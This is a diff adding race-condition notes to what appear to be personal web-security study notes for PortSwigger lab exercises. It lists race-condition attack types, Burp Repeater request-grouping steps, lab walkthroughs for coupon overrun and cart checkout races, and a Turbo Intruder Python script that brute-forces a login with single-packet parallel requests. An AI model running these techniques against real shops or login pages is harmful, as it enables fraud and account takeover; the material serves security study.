@@ -982,9 +982,69 @@
   - **send group in parallel**    
 
 ## Race Condition
-Content for Race Condition...
+Read up: [Smashing the state machine: The true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)   
+**Types of attacks**   
+- Redeeming a gift card multiple times
+- Rating a product multiple times
+- Withdrawing or transferring cash in excess of your account balancE
+- Reusing a single CAPTCHA solutio
+- Bypassing an anti-brute-force rate limit
+
+**Burp Repeater - Sending grouped HTTP requests**   
+- send group in sequence (single connection): test for potential client-side desync vectors
+- Send group in sequence (separate connections): test for vulnerabilities that require a multi-step process
+- Send group in parallel: test for race conditions
+
+**Decting and exploiting**
+- HTTP/1: last-byte synchronization technique
+- HTTP/2: single-packet attack technique, (Using a single TCP packet to complete 20-30 requests simultaneously)
 
 ### Race Condition Lab
+- Limit overrun race conditions
+  - For 20% off use code at checkout: **PROMO20**
+  - Apply coupon code, intercept > send to repeater: POST /cart/coupon
+  - Create 20 duplicate tabs (Ctrl+R)
+  - **Create a new group > add tabs to group > check the 20 repeaters box**
+  - Send group in paralle (single-packet attack)   
+- Bypassing rate limits via race conditions
+  - POST /login HTTP/1.1   
+    csrf=V3z6oyspnjRPU9Dow4w6Dx96MpCeHVTT&username=carlos&password=`%s`   
+  - Right click request > extension > turbo intruder > **send to turbo intruder** > select select examples/race-single-packet-attack.py   
+  - Amend the python code in below   
+    ```Python
+    def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # assign the list of candidate passwords from your clipboard
+    passwords = wordlists.clipboard
+    
+    # queue a login request using each password from the wordlist
+    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    
+    # once every request has been queued
+    # invoke engine.openGate() to send all requests in the given gate simultaneously
+    engine.openGate('1')
+
+    def handleResponse(req, interesting):   
+    table.add(req)   
+    ```
+    - start attack > observe 302 response code   
+- Multi-endpoint race conditions
+  - create tab group
+    - add gift card: POST /cart productId=2&redir=PRODUCT&quantity=1
+    - check out: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
+    - add jacket: POST /cart productId=1&redir=PRODUCT&quantity=1
+  - under check out tab > send group (parallel)
+- Single-endpoint race conditions   
+- ddd
+- ddd
 
 ## SSRF (Server-Side Request Forgery)
 Content for SSRF...
